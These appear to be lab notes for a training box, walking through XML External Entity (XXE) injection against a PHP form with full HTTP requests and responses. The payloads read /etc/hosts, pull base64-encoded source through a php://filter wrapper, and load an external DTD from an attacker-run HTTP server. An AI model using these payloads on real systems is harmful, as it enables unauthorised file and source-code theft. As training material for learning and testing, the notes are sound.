# XXE

## Identification

### Request

```http title="Request" hl_lines="1 15-21"
POST /submitDetails.php HTTP/1.1
Host: 10.129.234.170
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 148
Origin: http://10.129.234.170
Sec-GPC: 1
Connection: keep-alive
Referer: http://10.129.234.170/
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<root>
<name></name>
<tel></tel>
<email>example@example.com</email>
<message></message>
</root>
```

### Response

```http title="Response" hl_lines="9"
HTTP/1.1 200 OK
Date: Mon, 16 Jun 2025 21:37:32 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 63
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Check your email example@example.com for further instructions.
```

### Testing an Entity

```http title="Request" hl_lines="16-18 22"
POST /submitDetails.php HTTP/1.1
Host: 10.129.234.170
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 148
Origin: http://10.129.234.170
Sec-GPC: 1
Connection: keep-alive
Referer: http://10.129.234.170/
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
<!ENTITY xxe "XXE">
]>
<root>
<name></name>
<tel></tel>
<email>&xxe;</email>
<message></message>
</root>
```

### Testing an Entity (Response)

```http title="Response" hl_lines="9"
HTTP/1.1 200 OK
Date: Mon, 16 Jun 2025 21:39:34 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 51
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Check your email XXE for further instructions.
```

## Reading Sensitive Files

```http title="Request" hl_lines="16-18 22"
POST /submitDetails.php HTTP/1.1
Host: 10.129.234.170
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 148
Origin: http://10.129.234.170
Sec-GPC: 1
Connection: keep-alive
Referer: http://10.129.234.170/
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
<!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<root>
<name></name>
<tel></tel>
<email>&xxe;</email>
<message></message>
</root>
```

## Reading Source Code

### PHP Wrapper

```http title="Request" hl_lines="16-18 22"
POST /submitDetails.php HTTP/1.1
Host: 10.129.234.170
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 148
Origin: http://10.129.234.170
Sec-GPC: 1
Connection: keep-alive
Referer: http://10.129.234.170/
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<root>
<name></name>
<tel></tel>
<email>&xxe;</email>
<message></message>
</root>
```

### CDATA

```dtd title="xxe.dtd" linenums="1"
<!ENTITY xxe "%begin;%file;%end;">
```

```sh
my@attack:~$ python3 -m http.server 8000
```

```http title="Request" hl_lines="16-22 26"
POST /submitDetails.php HTTP/1.1
Host: 10.129.234.170
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 148
Origin: http://10.129.234.170
Sec-GPC: 1
Connection: keep-alive
Referer: http://10.129.234.170/
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file:///var/www/html/index.php">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://10.10.14.164:8000/xxe.dtd">
%dtd;
]>
<root>
<name></name>
<tel></tel>
<email>&xxe;</email>
<message></message>
</root>
```
